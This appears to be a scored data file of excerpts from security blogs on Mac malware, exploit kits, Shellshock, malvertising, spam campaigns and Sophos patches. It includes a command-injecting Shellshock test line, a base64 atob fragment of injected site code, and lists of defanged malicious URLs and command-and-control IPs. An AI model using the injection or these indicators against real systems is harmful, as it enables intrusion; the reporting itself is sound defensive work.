Distinguished Researcher",0.009562063253802378
"Picture Credits: ©phylevn/Flickr
",0.007496923827436275
"OS X Lamadai: Flashback isn't the only Mac malware threat
The Flashback trojan has been all over the news lately, but it is not the only Mac malware threat out there at the moment. A few weeks ago, we published a technical analysis of OSX/Lamadai.A, the Mac OS X payload of a multi-platform attack exploiting the Java vulnerability CVE-2011-3544 to infect its victims. OSX/Lamadai.A has",0.012400932443045964
25 Apr 2012 - 06:27AM,0.011447209435147654
"The Flashback trojan has been all over the news lately, but it is not the only Mac malware threat out there at the moment. A few weeks ago, we published a technical analysis of OSX/Lamadai.A, the Mac OS X payload of a multi-platform attack exploiting the Java vulnerability CVE-2011-3544 to infect its victims. OSX/Lamadai.A has",0.01246312341910405
"The Flashback trojan has been all over the news lately, but it is not the only Mac malware threat out there at the moment. A few weeks ago, we published a technical analysis of OSX/Lamadai.A, the Mac OS X payload of a multi-platform attack exploiting the Java vulnerability CVE-2011-3544 to infect its victims. OSX/Lamadai.A has built-in features typical of a backdoor: namely download and execution of an arbitrary file, uploading of local files to the operator’s Command and Control (C&C) server, and spawning of a command-line shell.",0.011247101570576179
"After the technical analysis was done, we began the monitoring phase. This phase is very important because it allows for tracking of how the malware is used by its operator. We can catch new variants of the threat early on, or even a totally different malware family (as often seen in pay-per-install schemes), or see the operator launch Denial-of-Service attacks (or any other kind of malicious activity) from the infected systems.",0.012998593319299867
"The monitoring phase allowed us to witness a short, live dialog between our infected machine and the malware operator that we published this dialog in our initial analysis of OSX/Lamadai.A. This experience gave us some new ideas that we could put in place in order to gather more knowledge about this threat and the person or people behind it.",0.011280625023945223
"What we did is this: we planted some fake files in the home directory of our test “infected user” and waited for the operator to come back. About one week later, we got our first connection. Here are the highlights of the dialog that took place over a period of about 10 days. It started with a little reconnaissance in the ~/Documents directory. The Unix command ls is used to list directory content:",0.010763572141536226
Then we see the theft of some Tibetan army status documents and a little porn for added value.,0.012540833348153924
"Now more reconnaissance and file theft, this time in the ~/Downloads directory.",0.010594984297187082
It is quite interesting to see that the operator did not steal all the files we had put out for him. He left these three untouched:,0.014473342413022117
"2012_report.doc
application.zip
im5744.jpg",0.00929995953179974
"A few days went by during which the operator was only connecting to the system to issue some basic commands, most likely with a view to determining whether this was a newly infected system or not. The Unix command id returns the current user's identity and the sw_vers command prints the OS version information.",0.009949836688544655
We decided it was time to refresh the environment to simulate infection of a new user and to install interesting new files to the user’s home directory.,0.012422457982154023
"Shortly after the new environment was up and running, we got an incoming connection. Almost instantly, the operator issued a command to download and execute a file (technical details of the new file below)!",0.013683569640458026
"Immediately after, the operator ran a few netstat commands, most probably looking to see if the new payload was listening on the network properly. The Unix command netstat displays the network status of the system, such as network connections and routing table.",0.01514498905276851
"Not seeing what he wanted to see, our operator tried to re-execute the dropped executable! Let’s see how that turned out:",0.010478323987735738
"Yes, you do have to specify the path to the executable when /tmp is not in $PATH. In despair, he attempted to take some screenshots of the entire desktop window, using the OS X ‘screencapture’ command. Oddly enough, the file was not saved in his current work directory as it should have. We can’t explain why that happened.",0.012469398527515052
"Then, a few connection attempts later, the operator logged back on and totally lost it. He issued two Unix ‘rm’ commands, used to remove directory entries: one to remove the user’s home directory and one to remove the system’s root directory.",0.01216861925468371
That concludes this dramatic episode of Monsieur Frustrated Operator. Now to some technical stuff.,0.013705998105895456
"One of the first things we did was to recover and analyze the Mach-O executable dropped onto our test machine. We were curious to see what that was: a new variant of OSX/Lamadai, or even a specialized new piece of software? Instead, we found it was the same variant of OSX/Lamadai with a hardcoded C&C server set to 127.0.0.1. This explains why the operator grepped his netstat output for “127.0.0.1”. However, the rationale behind this action is up for debate inside ESET’s Security Intelligence Laboratory. Some argue that the operator realized he was connected to a monitoring system instead of a real, infected one and wanted to redirect the traffic away from the real C&C. Others contend that it would have been easier for him to simply deactivate or remove the malware from the system.",0.011738516284318101
"Also, when we first analyzed OSX/Lamadai.A, we said that the malware did not have persistence capabilities on an OS X 10.7.2 system, as the path /Library/Audio/Plug-Ins/AudioServer was not user-writable. We looked a little deeper into this, as other researchers reported that the threat was indeed persistent on their machines. We realized that this very same path is user-writable in previous OS X versions (10.5/Leopard and 10.6/Snow Leopard). This is the cause of some potential confusion and a timely reminder of the benefits of upgrading to the latest version of OS X.",0.010377872633617224
"Credits go to Marc-Étienne M. Léveillé for the technical analysis and test environment setup, thanks to the usual suspects for reviewing and commenting this article.",0.015045150072471314
MD5 of the dropped executable: 46c8ca78af43012388936345336d203b,0.01017726917349282
Alexis Dorais-Joncas,0.009430687948950855
"Security Intelligence Team Lead
",0.00870704009514034
"Exploit kits: Winter 2017 review
A few months have passed since our Fall 2016 review of the most common exploit kits we are seeing in our telemetry and honeypots. Today, we take another look at the current (bleak) EK scene by going over RIG, Sundown, Neutrino and Magnitude.
There haven’t been any major changes in the past little while and exploit kit-related infections remain low compared to those via malicious spam. This is in part due to the lack of fresh and reliable exploits in today’s drive-by landscape.
Pseudo-Darkleech and EITest are the most popular redirection campaigns from compromised websites. They refer to code that is injected into – for the most part – WordPress, Joomla, or Drupal websites and automatically redirects visitors to an exploit kit landing page.
Malvertising campaigns keep fuelling redirections to exploit kits as well, but can greatly vary in size and impact. The daily malverts from shady ad networks continue unchanged while the larger attacks going after top ad networks and publishers come in waves.
In the following video, we do a quick overview of those exploit kits; if you are interested in the more technical details please scroll down for additional information on each of them.",0.01571139734794924
"Most used vulnerabilities
Internet Explorer",0.006218786297269241
"CVE-2016-0189
CVE-2014-6332
CVE-2013-2551",0.010194183213033003
Information disclosure,0.007560634412901335
"CVE-2016-3351
CVE-2016-3298
CVE-2016-0162",0.01072169006205037
Edge,0.010549732971342096
"CVE-2016-7200
CVE-2016-7201",0.009418575976379406
Flash,0.00923244839910986
"CVE-2016-4117
CVE-2016-1019
CVE-2015-8651
CVE-2015-7645",0.011507596473250503
Silverlight,0.008631835962635392
CVE-2016-0034,0.009019183109075235
"RIG EK
RIG EK remains the most popular exploit kit at the moment used both in malvertising and compromised websites campaigns. Its primary payloads are ransomware (Cerber and CryptoShield).
The landing page structure (URL and source code) hasn’t really changed, but it is now using a pre-landing page to filter bots and other non-legitimate traffic.",0.014254517238168174
"Payload here: Dreambot
Gate (browser check)",0.009445487271190656
Landing page,0.008976301740969528
"Sundown EK
Sundown EK keeps on changing its URL patterns, mainly for the Flash exploit and its payload URLs. Sundown is a lot more quiet than RIG EK and for the most part contained to some malvertising campaigns.",0.020645469679600903
"Payload here: VenusLocker
Landing page",0.008076688756194716
"Neutrino EK
Neutrino EK seems to be the weapon of choice for special malvertising attacks that are difficult to reproduce. It features its usual pre-filtering gate that includes several checks against VMs and security software.",0.014290251534311404
"Payload here: Neutrino bot
Filtering gate (fingerprinting)",0.012891895142190912
Landing page,0.008976301740969528
"Magnitude EK
Magnitude EK is a very geo-aware exploit kit being restricted to Asia at the moment. It uses decoy finance or bitcoin websites with a special referer to lead to its gate.",0.01290474274191622
"Payload here: Cerber
IE exploit",0.006394853510381271
Landing page,0.008976301740969528
"Wrap up
There are more exploit kits than just those mentioned in this blog, but some were not included because they were simply copycats or because we have only seen them very sporadically.
Some EKs are indeed quite difficult to reproduce without a proper setup and some previous knowledge of the various traps affiliates and traffers are putting in the way. In other cases, they may fall off the radar until a new campaign (i.e. malvertising) is put in place.
While there hasn’t been a big focus on getting newer exploits integrated, we can note that exploit kit authors are investing some time into better bot detection and evasion, essentially trying to optimize the leads they are getting.
However, we should still be aware that this situation could change as new and powerful exploits can be discovered at any time and come with a ready-to-use proof of concept. For instance, CVE-2017-0037, a vulnerability that affects IE and Edge, is something attackers are likely to integrate soon.
",0.010955371328209118
UTM Up2Date 9.104 Released,0.00844032962069885
"Written by
Eric Bégoc",0.010229904213713614
"August 08, 2013",0.009466459298868024
Network up2date UTM UTM 9,0.01007005226623292
A new Up2Date is available for Sophos UTM. Release 9.104 fixes some bugs and increases the stability of your UTM 9 installation. While you will get considerably more detailed information from our Wireless Protection we also changed behavior for the RED/VPN notifications. We have also improved the performance for DNS lookups in our Web Filter. Read on to see the whole list of changes.,0.009679457258257251
"Sophos UTM 9.104-17
News",0.009326564180754615
"Bugfix Release
Fixed: Several issues with RED and Wifi stability
Fixed: Several issues with Web Protection reporting
Fixed: Several issues with IPv6 Prefix Delegation
Fixed: Missing entries in the Japanese Localization
Added: Button to reset UTM ID to be able to use Endpoint Protection on cloned machines
Changed: RED/VPN up/down notifications are disabled by default
Changed: Show more detail information in Wireless Protection
Changed: Improve DNS lookup performance in Web Filter",0.010041272218703212
Remarks,0.009780636038266843
"System will be rebooted
Configuration will be upgraded
Connected REDs will perform firmware upgrade
Connected Wifi APs will perform firmware upgrade",0.010102543935749386
Bugfixes,0.009816324567177737
"22750 Swapon failed for explicit UUID
25742 ha: disabling virtual_mac for ha did not result in different mac addresses on master/slave
25766 RED 50 connection is permanently dropped after HA takeover
25916 SUM can’t set Web Filter URL Blacklist and URL Whitelist
26002 Web Application Security: .docx files broken after upload and download
26052 Performance problem in MiddleWare when generating SSL VPN configuration with many networks and users
26066 Show Frequency Band in the info of the Wireless Networks
26119 Wifi [ASG]: MAC Filter Whitelist not working
26452 Web Security reporting does not work correctly
26613 Since update to v9.101 inodes are filling up the slave node root partition
27481: Permanent openvpn daemon restarts after installing UTM 9.104 soft release
27495: CVE-2013-4854: A specially crafted query can cause BIND to terminate abnormally [9.1]",0.008325533322298795
"Download:
While you do not need to manually download Up2Date packages (they will automatically download and prepare themselves for you to install), for manual application of Up2Dates or for UTM installations without Internet connections, you can retrieve them using the link below.
Download Link*: ftp://ftp.astaro.com/UTM/v9/up2date/u2d-sys-9.103005-104017.tgz.gpg
MD5 Sum: 68b7707c1f39388839a81c24a12efa18
Size:  ~94MB
*Note that the Up2date package file names now include the source version TO the target version (above is 9.103-5 to 9.104-17).
Up2Date Installation: Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version. There are two ways to apply an already-downloaded Up2Date package to the system:
1. Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
2. Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.01024217872940647
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you). e.g. “[9.104] Enabling RED up/down notifications”.
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.013270127619472438
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
"New bash bug could wreak havoc on Linux and OS X systems
Update (12:34 PM): Web security firm Sucuri has already detected in the wild attempts to load remote shells onto servers using the #bashbug. Shells can allow attackers to take remote control of web servers and use them for various purposes.
It would have been hard to imagine anything as bad as the HeartBleed bug was going to happen but the recent discovery of a flaw in the popular bash command shell very well could be.
Bash is used as the command interpreter for many Linux systems including Red Hat, CentOS, Ubuntu and Debian and ships with Mac OS X.
The vulnerability which was quickly nicknamed ‘shellshock’ was discovered by Stéphane Chazelas and assigned CVE-2014-6271.
It allows anyone to execute arbitrary code by abusing an environment variable and launching a function containing trailing commands.
While patches have been issued, system administrators will be working long shifts to go through every single server, router and other piece of equipment that uses the bash shell.
It is a race against time as proof of concept code in the form of a metasploit module is already available meaning the bad guys are hard at work trying to hack into affected systems.
In fact the vulnerability is so severe it has been assigned a score of 10 and yet is almost trivial to adapt and use for nefarious purposes.
To verify if your system is vulnerable, you can type the following command:
env x='() { :;}; echo vulnerable' bash -c ""echo bash bug""
If it displays something like this:",0.010885825898914736
then you are affected by the bash bug and will want to apply to patch ASAP!,0.007832712724546553
"@jeromesegura
",0.011896365074086979
"By Dancho Danchev
Kindle users, watch what you click on!
Cybercriminals are currently mass mailing tens of thousands of fake Amazon “You Kindle E-Book Order” themed emails in an attempt to trick Kindle users into clicking on the malicious links found in these messages. Once they do so, they’ll be automatically exposed to the client-side exploits served by the Black Hole Exploit Kit, ultimately joining the botnet operated by the cybercriminal/cybercriminals that launched the campaign.
More details:",0.011999068632270515
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample spamvertised URLs participating in the campaign:
hxxp://sombranomada.info/amazonzon.html
hxxp://minskcar.by/amazonzon.html
hxxp://mariamadredelaiglesia.cl/amazonzon.html
hxxp://myataworld.com/amazonzon.html
hxxp://apel-institut.org/amazonzon.html
hxxp://wordofmouthbali.com/amazonzon.html
MD5 for the Java exploit: MD5: c9bc87eef8db72f64bac0a72f82b04cf – detected by 5 out of 46 antivirus scanners as HEUR:Exploit.Java.CVE-2012-0507.gen
MD5 for the PDF exploit: MD5: 53c90140fde593713efe6298547ff205 – detected by 26 out of 46 antivirus scanners as Exploit:Win32/CVE-2010-0188
Upon successful client-side exploitation, the campaign drops MD5: 330ad00466bd44a5fb2786f0f5e2d0da – detected by 3 out of 45 antivirus scanners as Trojan.Win32.Reveton.a (v).
Once executed, the sample creates the following files on the affected hosts:
C:Documents and SettingsUserApplication DataKB00776902.exe
C:DOCUME~1UserLOCALS~1Tempexp3.tmp
C:DOCUME~1UserLOCALS~1Tempexp3.tmp.bat
Drops MD5: 6104fb43f2dbe10d254b395a05704428
It also creates the following Mutexes:
LocalXMM000001A4
LocalXMI000001A4
LocalXMM00000558
LocalXMI00000558
LocalXMM00000580
LocalXMI00000580
LocalXMM000004EC
LocalXMI000004EC
LocalXMM000004F0
LocalXMI000004F0
It then phones back to:
85.214.143.90
130.79.80.40
213.199.201.180
46.51.189.229
91.121.30.185
89.110.148.213
81.17.22.14
88.119.156.20
161.53.184.3
94.23.6.95
88.191.130.98/J9/vp/EGa+AAAAAA/2MB9vCAAAA
More malware samples are known to have phoned back to the same IPs. For instance:
MD5: a86d0929b7baf1839f8f6ef19a1a9ffa
MD5: df9d41114a2d54f2d0770392ab06dddc
MD5: d2d98755969029c47ed81a2a2efbc147
MD5: 22789f547eced1982aab80fb7549dfea
MD5: f9696cd9637cbc3d029ef63fa22b35a3
MD5: 77cdee1f4e57836b74ab827ad23d88b3
MD5: abe3a0bbed3abbd496b6b015509e0033
MD5: 617657758f30d7bd7e5db52f3133b6dc
MD5: 83d834514b498417097c3ae1d34cee6c
MD5: 4c362a47a0b72280c0b061588a50e1e1
MD5: 575434edfc538a62ac1fcde2a7250fac
MD5: a1e1242dac7cd5245b8ffa4125186ef5
MD5: 8899155ae4a7b4ffe9ebe2d89cea0ae4
MD5: 60fd9d820a01343182ac51b57f21d291
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on Twitter.
",0.013429408098302842
OpenSSL man-in-the-middle vulnerability – Network Gateway product patch information,0.006617554926920399
"Written by
Chris McCormack",0.009511367839243778
"June 06, 2014",0.008425213196877168
Network Partners Products & Services Email Appliance OpenSSL Sophos Web Gateway SUM up2date UTM,0.008352133725195943
"On June 5th, 2014 a vulnerability (CVE-2014-0224) was found in OpenSSL that impacts our network security products. Fortunately, as of the publication of this article, there are no known in-the-wild attacks. Of course, as you’ve come to expect from Sophos, we’ve wasted no time in getting to work on patches to fix this vulnerability.
The vulnerability exists in OpenSSL and can allow an attacker using a man-in-the-middle attack to decrypt and modify traffic between a vulnerable client and server. Both client and server must be vulnerable for this exploit to work. OpenSSL versions 1.0.1 and 1.0.2-beta are affected.",0.009276766938061454
"At this time, we believe other vulnerabilities discovered this week in OpenSSL do not impact our network security products.
The following Sophos Network Security products and versions require a patch – we are working on them with the highest priority:",0.012927926939927947
"Sophos UTM v9.2
Sophos UTM v9.1
Sophos UTM v8.3
SUM v4.1/4.2
Sophos Web Appliance v3.9.x.x
Sophos Email Appliance v3.7.x.x
PureMessage for UNIX",0.015950967740176458
"For further information on all affected Sophos products, including patch availability, read the Knowledgebase article.
Once available, updates will be provided by the normal means for your product.
Fortunately, this vulnerability with OpenSSL does NOT require new SSL certificates to be deployed.
We will update this article with more information as it becomes available so check back regularly.
If you wish to discuss this, there is an active thread on the User Bulletin Board (for UTM) and SophosTalk Forums (for other network security products).
Update:
More information on the vulnerability, other products affected and how you can protect yourself, are outlined in our latest blog article on this subject.",0.012152536671012903
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Tech Brief: An inside view of a zero-day campaign
Overview
Discovering a new vulnerability in a popular piece of software is the Holy Grail for cybercriminals. The period between this vulnerability being weaponized into an exploit and becoming public knowledge poses a huge security risk to consumers and businesses. During this time, a completely open window of attack exists because even fully patched systems are affected. This is a zero-day.
This paper details one such exposure using Malwarebytes’ unique view of zero-day threats as collected through its anti-exploit products. Because the anti-exploit products are deployed on a large user base that spans the globe, researchers were able to profile accurately a zero-day (CVE-2015-0313) that leverages Adobe Flash Player, and shine a light on the lifecycle, delivery mechanism, and criminal practices behind it.
Why we chose this zero-day
There have been three Flash Player zero-days so far in 2015, but the reasons we focused on this was because:",0.009626902033173734
"Targeting was very specific, adding to its potency and showing a clear capability for organization.
The Malwarebytes data shows a lengthy attack campaign—nearly two months between December 2014 and early February 2015.
The potentially high volume of infections achieved by the poisoning of advertisements on high-volume sites.",0.011455813600398712
"TOP-LINE FACTS
CVE-2015-0313: Adobe Flash vulnerability, fixed with version 16.0.0.305.
Delivery: Malvertising on a popular ad network using the HanJuan exploit kit. The exploit was hosted on a rotating series of domains.
Window of exposure: First seen 12/10/2014; made public 2/2/2015.
Payload: Crypto Ransomware/click fraud.
TIMELINE
This zero-day campaign is notable for its length, lasting approximately two months. Typically, such exploits have a relatively short shelf life due to discovery by the security or research community. This campaign remained below the radar for a longer than usual period of time, as follows:
First seen: Retrospective data analysis shows the first instance of the zero-day being blocked by Malwarebytes Anti-Exploit on December 10, 2014.
Dynamic domains: The campaign rotated the exploit landing page around numerous domains, each hosting it for approximately two days on average.
Campaign exposed: The final day of this particular campaign was February 3, 2015—one day after Adobe issued a security advisory that publicly alerted everyone to the zero-day. Adobe issued a fix (patch) one day later.
Take-up by others: The exploit, now not a true zero-day given its “known” status, is quickly integrated into other exploit kits.",0.013839850490852124
"TARGETING
The actors used a highly targeted mass malvertising campaign to deliver the zero-day threat.
Scale: Delivered using a well-known advertising network that claims to have a reach of 500+ million uniques, and is “ranked No. 1 in the U.S.” by Comscore by reaching 97% of Internet users.
Known targets: Geo-targeted at U.S. consumers, and aimed at residential IP addresses at particular times of day to ensure the highest possible return. Each visitor was pre-qualified by OS type, device, and other demographics to ensure only the most relevant were served the exploit.
Stealth: Each individual visitor was exposed to the exploit just once, and would not infect anyone using a VPN or web proxy, ensuring it remained hidden from security researchers and software.
Costs: Threat actors paid an average of $0.75 per each 1000 pre-qualified users exposed to the infected adverts. However, this dropped to as low as $0.06 per 1000 during less trafficked times of day and on
lesser-known websites.
TRAFFIC GUARANTEED
To maximize the exposure window, the bad actors chose to advertise on an array of highly ranked websites to deliver the zero-day. Whilst stealth was important, the importance of volumes of infections was also notable:
Respected sites: Throughout the campaign, some of the most respected sites on the planet were delivering the threat.  People’s innate “trust” for such sites enabled the group to infect visitors with minimal suspicion.
Traffic numbers: Similarweb.com shows the collective number of visits to the websites offering the zero-day to be over one billion in February 2015. It should be pointed out that this is an external data point that does not directly equate to a number of infections; rather, it gives an approximate idea of potential visitors exposed. The previously mentioned targeting features used, and natural cycling of advertisements on site, would filter overall visitor numbers down to live infection prospects.
It’s important to note that the sites involved were not willingly participating in the malvertising attacks, they were also victims in the campaign and had no control over what ads were shown on their sites.
CONCLUSIONS
This particular zero-day has all the hallmarks of a highly professional operation with significant resources. The precision with which it was targeted and its ability to avoid detection demonstrates significant forward thinking. This was a well planned and executed attack that leveraged the availability of cheap, yet highly effective, modern ad-serving technology to great effect.
Malvertising allows cyber criminals to target popular websites, which would normally be practically impossible to hack directly. Instead, crooks piggy back on ad networks that are already trusted and allowed. To use a metaphor, the bad guys are not attempting to go through a Maginot line, but, rather, are simply going around it.
The HanJuan exploit kit that was used to deliver this zero-day is notoriously quiet compared to its counterparts. Also, the URL patterns that it uses are rather standard looking and don’t really allow it to be identified. Had this zero-day been in another exploit kit, such as Angler EK, there’s no doubt but that it would have been spotted much sooner.
In addition, both the length with which the campaign was able to run and the volumes of traffic visiting the impacted sites point to a high volume of successful infections. It is impossible to say for sure without access to the exploit kit back-end, but the threat to Internet users from an unknown vulnerability such as this will amplify its success rate exponentially.
All in all, this zero-day underlines how the threat from exploits delivered through malvertising is one that should be taken much more seriously. Not just because of the growing technical proficiency of well-funded adversaries, but also because this is a trend that continues largely unregulated in the major markets wherein victims are specifically targeted.
Malvertising is increasing in frequency and, when combined with a zero-day, can prove devastatingly effective. It is a problem, and one that the advertising industry should be working closely with security companies and regulators to address.
",0.02182756884829351
"Fake Adobe Updates
Adobe's Product Security Incident Response Team (PSIRT) reports  that malicious emails are circulating claiming to be Adobe security updates, many of them signed by ""James Kitchin"" of ""Adobe Risk Management"", or a similar (presumably mythical) team. Adobe says that the messages include links to download instructions for a security update that addresses ""CVE-2010-0193 Denial of Service",0.014081014396782776
6 May 2010 - 12:30AM,0.011242707447732703
"Adobe's Product Security Incident Response Team (PSIRT) reports  that malicious emails are circulating claiming to be Adobe security updates, many of them signed by ""James Kitchin"" of ""Adobe Risk Management"", or a similar (presumably mythical) team. Adobe says that the messages include links to download instructions for a security update that addresses ""CVE-2010-0193 Denial of Service",0.013308368758605194
"Adobe's Product Security Incident Response Team (PSIRT) reports  that malicious emails are circulating claiming to be Adobe security updates, many of them signed by ""James Kitchin"" of ""Adobe Risk Management"", or a similar (presumably mythical) team.",0.014810378911711775
"Adobe says that the messages include links to download instructions for a security update that addresses ""CVE-2010-0193 Denial of Service Vulnerability"" (or similar).",0.01417515741702935
"It sounds as if the bad guys have done some homework: CVE-2020-0193 is a real issue – see the CVE (Common Vulnerabilities and Exposures) listing at http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0193. However, it isn't particularly new, and Adobe already has a Security Bulletin at http://www.adobe.com/support/security/bulletins/apsb10-09.html that addresses it.",0.01124686297110078
I'm rather surprised that Adobe didn't mention that in its blog on the current issue since the update addresses quite a few other CVE-identified issues:,0.008311282898823102
"CVE-2010-0190 through CVE-2010-0199
CVE-2010-0201 through CVE-2010-0204
CVE-2010-1241",0.016877198053915743
"While I can't vouch for the efficacy of that update or any other, clearly, it would be as well to be suspicious of any mail that mentions a new update to address any of those issues, in case any of the listed identifiers are used as ""hooks"" for other malicious mails. Of course, it's by no means unknown for blackhats to use made-up CVE or other vulnerability/bulletin identifiers, so the message there is not to take it for granted that an impressive identifier is real. But it's not the only take-home message.",0.010504890314894544
"Presumably (I haven't seen one so far) these are unsolicited messages, and no responsible company spams that sort of message out to the entire internet, or a subset of it. If you're subscribed to the Adobe Security Notification Service at http://www.adobe.com/cfusion/entitlement/index.cfm?e=szalert, you should receive email notifications that point to advisories/bulletins, but you have to subscribe first, and they will point to pages on Adobe's own adobe.com domain. (Of course, you should always beware of misleading links and redirects, too.) While I did complain here some time ago that the notification service didn't seem to be consistently updated, that issue seems to have been addressed some time ago: in fact, that's how I became aware of this particular issue.",0.01543448682216253
"It's not impossible, of course, that messages like this may appear to come from APNS in the hope of catching out people who are subscribed, in the same way that phishing scams are mailed out indiscriminately in the hope of catching out someone who has an account with the bank whose email and web site is spoofed.",0.017180850983035678
"Note also that Adobe notifications link only to advisories and bulletins: they never link directly to an executable update, or carry such an update as an attachment.",0.016411679131267287
"Adobe says that its product updates are only available ""(1) via the product's automatic update feature or (2) from the Adobe website at http://www.adobe.com/downloads/updates/"".",0.01894374863736259
"David Harley CISSP FBCS CITP
Research Fellow & Director of Malware Intelligence",0.010149512890134771
"ESET Threatblog (TinyURL with preview enabled): http://preview.tinyurl.com/esetblog
ESET Threatblog notifications on Twitter:
http://twitter.com/esetresearch; http://twitter.com/ESETblog
ESET White Papers Page: http://www.eset.com/download/whitepapers.php",0.013760988131441998
Securing Our eCity community initiative: http://www.securingourecity.org/,0.012284630284823073
"Also blogging at:
http://amtso.wordpress.com/
http://avien.net/blog
http://blogs.securiteam.com
http://blog.isc2.org/
http://macvirus.com/
http://chainmailcheck.wordpress.com
http://smallbluegreenblog.wordpress.com/
",0.014082499932837611
"Celebrity chef Jamie Oliver’s website hacked, redirects to exploit kit
Update (2/18/15): Business Insider’s report quotes Jamie Oliver’s Management Team
The team at jamieoliver.com found a low-level malware problem and dealt with it quickly. The site is now safe to use. We have had only a handful of comments from users over the last couple of days, and no-one has reported any serious issues. We apologise to anyone who was at all worried after going on the site. The Jamie Oliver website is regularly checked for vulnerabilities by both our in-house team and an independent third-party and they quickly deal with anything that is found. The team is confident that no data has been compromised in this incident but if anyone is worried, do please use the contact form on the site.
We have confirmed that the site is now clean and are pleased with the quick turn around from the initial report to their action.
However anyone who has browsed Jamie Oliver’s site should perform a security scan to ensure their computers were not infected. The free version of Malwarebytes Anti-Malware detects and removes this threat.
Original Story: While routinely checking the latest exploits and sites hacked, we came across a strange infection pattern that seemed to start from popular website jamieoliver[dot]com (ranked #536 in the UK and bringing in an average of 10 million visits per month), the official site of British chef Jamie Oliver.
Contrary to most web-borne exploits we see lately, this one was not the result of a malicious ad (malvertising) but rather a carefully and well hidden malicious injection in the site itself.
Infection overview
Compromised JavaScript
hxxp://www.jamieoliver.com/_beta/signup/js/jquery-ui-1.10.4.custom.min.js
This is where the malicious injection takes place:",0.009979512172301752
"This code was not easy to spot immediately as the culprit, but given its position on the page (bottom), it seemed to be the likely candidate.
To better understand what it does, we need to deobfuscate it first:",0.012171022469319559
"Now we see the purpose: an iframe creation. However, the bad guys added another layer of obfuscation by masking the iframe URL as:
var h = window.atob('YW50a2FpLmNvbS93cC1jb250ZW50L3BsdWdpbnMv');
The WindowBase64.atob() function decodes a string of data which has been encoded using base-64 encoding. Here’s one way to view it after decoding:",0.012535258371866642
"Second compromised site
hxxp://antkai.com/wp-content/plugins/
It appears that antkai[dot]com is a legitimate WordPress site which has been compromised. It performs conditional redirections to an exploit kit landing page.",0.011002149114466064
"If you visit the same page twice, you will not get the malicious link to the exploit kit. There also appears to be heavy filtering of VPNs, which is why reproduction of this infection required a genuine residential IP address.
Exploit Kit (Fiesta EK)
hxxp://rkgizp.lioretasoped.xyz/images/12685335741423973973.js
hxxp://rkgizp.lioretasoped.xyz/images/12685335741423973973.xap?id=12685335741423973976
hxxp://rkgizp.lioretasoped.xyz/images/12685335741423973973.php?xap&id=12685335741423973976
hxxp://rkgizp.lioretasoped.xyz/12685335741423973976/2
hxxp://rkgizp.lioretasoped.xyz/w0g1ep8h/72a14c91c0f7e2e90204580a06580f050e0a550a0001090a0206040105050b04;130000;182
Looking at the URL patterns of this exploit, it seemed to me that it was Fiesta-esque. However, contrary to what we normally see with Fiesta EK, this JavaScript piece was not even obfuscated:",0.009972675231330053
"The Exploit Kit launched at least three exploits (Flash (CVE-2015-0311), Silverlight (CVE-2013-0074) and Java) which were successfully blocked by Malwarebytes Anti-Exploit.",0.011290378715592686
The exploit was stopped at Layer 1 (ROP gadget) as it was calling the VirtualAlloc API.,0.012451902349875366
"Payload
If the user’s machine is not fully patched, a malicious dropper is downloaded and runs. Malwarebytes Anti-Malware detects is as Trojan.Dorkbot.ED.",0.018932540345335536
One of the noticeable effects post infection is search engine hijacks with unwanted redirections:,0.006970958765817992
"Users are mislead into installing fake software updates which end up wreaking havoc on the system:
This slideshow requires JavaScript.
Server side problem
It all started with a compromised JavaScript hosted on jamieoliver[dot]com. It could be a legitimate script that has been injected with additional content or a rogue script altogether.
The webmasters will need to look for additional evidence of infection, rather than simply restore or delete the offending script.
Typically, stolen login credentials or a vulnerable plugin can allow an attacker to gain access to a remote server and alter it.
We have contacted the administrators immediately upon discovery of this infection. We will update this blog post if additional information comes up.
",0.008558937074224504
"CVE‑2014‑4114: Details on August BlackEnergy PowerPoint Campaigns
In this post we provide additional information on how a specially crafted PowerPoint slideshow file (.PPSX) led to the execution of a BlackEnergy dropper.",0.013171054003784821
Robert Lipovsky,0.009327268366459585
14 Oct 2014 - 03:29PM,0.010826603378664257
In this post we provide additional information on how a specially crafted PowerPoint slideshow file (.PPSX) led to the execution of a BlackEnergy dropper.,0.011532756553859214
"At the Virus Bulletin conference that took place in Seattle last month, we talked about how the BlackEnergy trojan has evolved into a malicious tool used for espionage in Ukraine and Poland.",0.016813977585520612
"In our last post on the subject, we mentioned the following malware spreading vectors used in BlackEnergy campaigns this year:",0.016830297365985736
"Microsoft Word documents containing exploits, e.g. the CVE-2014-1761 vulnerability
Executables with a Microsoft Word icon, to lure the victim into opening them
Exploitation of Java
Installation through the Team Viewer remote control software
Microsoft PowerPoint documents containing the CVE-2014-4114 vulnerability",0.014899295739264518
In this post we provide additional information on the latter: how a specially crafted PowerPoint slideshow file (.PPSX) led to the execution of a BlackEnergy dropper.,0.012090637695515216
"In the August 2014 campaigns, a number of potential victims have received spear-phishing emails such as the one below.",0.013113881229592117
"The gist of the email’s Ukrainian text is that the Prime Minister of Ukraine, Arseniy Yatsenyuk, is instructing the Prosecutor General’s Office, the Security Service of Ukraine, Ministry of Internal Affairs and Ministry of Justice to check members of the parliament, parties and NGOs in Ukraine for any involvement in the support of rebels in the East of Ukraine and that a list of potential terrorist supporters is attached.",0.0161921183271041
"If the recipient took the bait and opened the PPSX attachment, they would see what they’d expect from the email description – a list of names:",0.014848703419003573
